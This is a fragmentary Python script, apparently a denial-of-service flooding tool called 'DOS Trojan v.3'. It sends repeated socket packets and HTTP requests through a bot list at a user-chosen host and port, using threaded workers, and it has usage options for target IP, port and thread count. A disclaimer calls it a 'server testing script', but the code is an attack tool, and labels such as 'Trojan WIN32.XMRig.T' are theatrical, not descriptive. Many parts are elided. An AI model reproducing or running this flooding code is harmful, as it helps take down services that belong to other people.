	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[34m",time.ctime(time.time()),"\033[0m \033[90mSending\033[0m \033[36mTrojan WIN32.XMRig.T !!!  \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m ERROR SERVER MAYBE DOWN!!!!\033[0m")
...
def dos2():
	while True:
		item=w.get()
		bot_bubleing(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[34m	DOS Trojan v.3 http://www.canyalcin.com/
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 win32.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
...
def get_parameters():
	...
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Buble")
...
if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[90m",host," \033[0m \033[36mport:\033[0m \033[90m",str(port),"\033[0m \033[36mturbo:\033[0m \033[90m ",str(thr),"\033[0m")
	...
	try:
		...
		print("\033[91mCheck Your IP Target And Port\033[0m")
		usage()
	while True:
